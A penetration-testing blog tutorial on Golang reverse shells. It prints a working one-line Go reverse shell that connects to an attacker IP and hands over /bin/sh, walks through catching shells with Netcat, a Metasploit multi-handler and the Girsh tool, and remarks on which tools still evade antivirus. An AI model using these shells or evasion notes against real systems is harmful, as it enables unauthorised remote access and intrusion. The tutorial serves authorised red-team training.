---
title: Getting Offensive with Golang
url: https://cyberarms.wordpress.com/2023/07/11/getting-offensive-with-golang/
source: CYBER ARMS – Computer Security
date: 2023-07-12
fetch_date: 2025-10-04T11:56:30.495475
---

# Getting Offensive with Golang

[Skip to content](#content)

[CYBER ARMS – Computer Security](https://cyberarms.wordpress.com/)

CyberSecurity Training and Offensive Security News

[![CYBER ARMS – Computer Security](https://cyberarms.wordpress.com/wp-content/uploads/2024/05/cyberarms-security-1.jpg)](https://cyberarms.wordpress.com/)

# Getting Offensive with Golang

![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-pentesting-cybersecurity.png?w=1200)

**Introduction**

Creating Reverse Shells and bypassing Anti-Virus (AV) with Golang. Using Golang in security has become very popular over the last few years. In this article I want to cover several existing Golang scripts that you can use to create Reverse Shells and possibly even bypass Anti-Virus.

This is part one of a two-part series. We will start our journey looking at a one-line reverse shell in Go, and then cover a couple apps that can generate multiple different shells. This article isn’t about writing custom Go scripts or post exploit – what to do after you get a remote shell. It is simply a quick and dirty overview of some existing Go shellcode for Pentesters and Red Teams.

Swissky’s one-line Go shell is up first. This one-line reverse shell works great against Linux based targets. Next, we will look at Girsh, a menu driven script that can create multiple different reverse shells for both Linux and Windows.

In Part 2, we will look at Go-Shellcode, a very good Go reverse shell. At last testing and with the right payload, still bypasses most common Windows Anti-Virus products.

*As always, this Article is for Educational & Informational Purposes Only.* *Never try to Access Systems that you do not have Permission to do so*

I used two Kali Linux VMs for this article, one a target and the other an attack system. Golang was already installed on the attacking system. I also used a Windows 11 system and a Windows Server 2022 (not shown) for testing some of the shells.

**Swissky Repo – Payload All the Thing, Golang Shell**

**Tool GitHub Site**: <https://github.com/swisskyrepo>

Swissky’s Github site has a one-line reverse shell for Golang that works great on Linux. All you need is a Netcat listener set up on the attacker system and then run the one liner on the Linux target.

Just set up a Netcat Listener on the Attacking system:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentest-2.png?w=428)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentest-2.png)

On the target, take the one line Go payload from Swisskeyrepo1 and enter the attacker IP address. Then, run in on the target system.

*echo ‘package main;import”os/exec”;import”net”;func main(){c,\_:=net.Dial(“tcp”,”**[Attacker\_IP\_Address]**:4242″);cmd:=exec.Command(“/bin/sh”);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}’ > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go*

As seen below:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentesting-2.png?w=698)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentesting-2.png)

If the target system has Golang installed, we immediately get a shell:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentesting-3.png?w=865)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/golang-pentesting-3.png)

Before we continue, there are several Go reverse shells available online and on GitHub that basically just open a simple remote communication shell to Netcat. You don’t have to use Netcat on the attacker system, you can use the Metasploit Framework to catch this type of basic shell.

Yes, it also works for Netcat-like shellcode that is compiled to run on Windows targets as well. Granted it won’t be a Meterpreter shell, just a basic shell, but if the target is Windows based you could try the “upgrade shell to meterpreter” module in Metasploit. Windows Defender does catch and block the “upgrade shell to meterpreter” post module, but other AV products may not.

*You can learn more about upgrading your shell to meterpreter here –* [*https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html*](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

Let’s take a minute and look at catching a basic Netcat shell with Metasploit.

**Catching Netcat (Generic) Shells using Metasploit**

You can use the Metasploit framework on your attacker system instead of just using Netcat. To do so, just start Metasploit on your attacking system and use a Multi Handler. For a Linux target you will need the “generic/shell\_reverse\_tcp” payload. Metasploit loads this as default, but I set it manually just to be sure. Then just enter your attacker IP address as LHOST and enter the port used as LPORT. When all is set, just enter “exploit”.

As seen below:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-1.png?w=682)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-1.png)

Now, run the one liner Go attack on the target system again. Metasploit acts like Netcat and completes the remote shell.

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-2.png?w=769)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-2.png)

The process is the same if the target is Windows based, and you are using a Windows version of a Netcat like shell attack. Just change the payload in Multi Handler to the Windows x64 shell.

As seen below:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-3.png?w=975)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-3.png)

Notice the only change is switching from the generic shell to the Windows x64 shell. Using the plain reverse shell payloads in Metasploit, you can catch any of the Netcat shells written in any language, and for any target platform.

**Girsh – Golang Interactive Reverse Shell vs Linux**

**Tool Author**: nodauf
**Tool GitHub**: <https://github.com/nodauf/Girsh>

Girsh is a quick and easy menu driven remote shell written in Golang. Until recently, the PowerShell module in Girsh did bypass Microsoft Defender and other major AV products. Though Defender catches it now, you may still have some luck with it against other AV products. For this example, we will create a quick Linux shell with it.

**Install & Usage**

With Golang installed all you need to do is pull Girsh down from GitHub.

* ***git clone*** ***<https://github.com/nodauf/Girsh>***
* ***cd src***
* ***go run main.go listen***

On first run it will download multiple dependencies. It will then display a Girsh prompt.

As seen below:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-4.png?w=787)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-4.png)

* Type “***menu***” to create a reverse shell
* Use the arrows to select an interface, then press enter
* When prompted for a reverse shell type, select “***python***”

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-5.png?w=813)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-5.png)

You are presented with multiple Python commands. Copy and run one of them on your target system.

You should immediately get a remote session.

* To see available sessions, type, “***sessions***”
* Then connect to the session you want using the “***connect ID#***” command

As seen below:

[![](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-6.png?w=538)](https://cyberarms.wordpress.com/wp-content/uploads/2023/07/go-redteam-6.png)

You now have a fully interactive remote shell.

In the [next part of this article](https://wordpress.com/post/cyberarms.wordpress.com/6905), we will look at using Go-Shellcode. A multi-function Go remote shell that works very well against Windows systems.

If you liked this article, check out my book, “[Advanced Security testing with Kali Linux](htt...